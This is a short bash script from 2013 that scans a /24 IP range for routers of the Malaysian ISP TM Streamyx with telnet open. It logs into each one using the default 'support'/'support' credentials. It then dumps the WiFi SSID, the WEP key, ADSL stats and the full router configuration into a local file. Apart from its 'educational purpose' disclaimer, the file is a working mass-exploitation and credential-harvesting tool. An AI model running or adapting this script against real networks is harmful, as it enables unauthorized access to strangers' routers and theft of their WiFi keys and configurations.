#!/usr/bin/env bash 
# tm streamyx router scanner
# test router default login and dump config
# if telnet is accessible to public
# weldan <mweldan@gmail.com>, 2013
# for educational purpose only  

if [ $# -ne 1 ]
then
    clear
    echo "#"
    echo "#"
    echo "# tm streamyx router telnet scanner"
    echo "###################################"
    echo "usage: $0 ip"
    echo "will scan entire ip range"
    echo "raw output will be stored in output.txt"
    echo "will grab these informations:"
    echo "- wifi login"
    echo "- adsl stat"
    echo "- router configuration"
    echo "###################################"
    echo "written to demonstrate flaw only, use at your own risk"
    echo ""
    exit
fi

nc=$(which nc)
if [ ! -f $nc ]
then
    clear
    echo "netcat is required."
    exit
fi 

ip=$1
port=23
IFS=. read -a array <<< "$ip"
for i in {1..254}
do
    currentip=${array[0]}.${array[1]}.${array[2]}.${i}
    if ($nc -zw2 $currentip $port)
    then
        (
        echo "support"
        sleep 1
        echo "support"
        sleep 1
        echo "wifissid"
        sleep 1
        echo ""
        echo "wifiwepkey"
        sleep 1
        echo ""
        echo "adslstat"
        sleep 1
        echo ""
        echo "dumpcfg"
        sleep 1
        echo ""
        echo "quit"
        sleep 1          
        ) | $nc -t -q 2 -vv $currentip $port >>./output.txt
    fi 
done
